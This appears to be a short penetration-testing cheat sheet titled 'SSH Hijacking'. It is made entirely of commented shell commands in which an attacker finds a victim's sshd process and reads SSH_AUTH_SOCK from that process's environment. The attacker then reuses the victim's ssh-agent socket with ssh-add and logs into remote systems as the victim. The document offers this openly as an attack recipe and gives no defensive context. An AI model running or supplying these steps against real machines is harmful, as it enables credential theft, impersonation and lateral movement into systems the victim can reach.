# SSH Hijacking

```
# Attacker finds the SSHd process of the victim
ps uax|grep sshd
 
# Attacker looks for the SSH_AUTH_SOCK on victim's environment variables
grep SSH_AUTH_SOCK /proc/<pid>/environ
 
# Attacker hijack's victim's ssh-agent socket
SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXXX/agent.XXXX ssh-add -l
 
# Attacker can login to remote systems as the victim
ssh remote_system -l vicitm
```
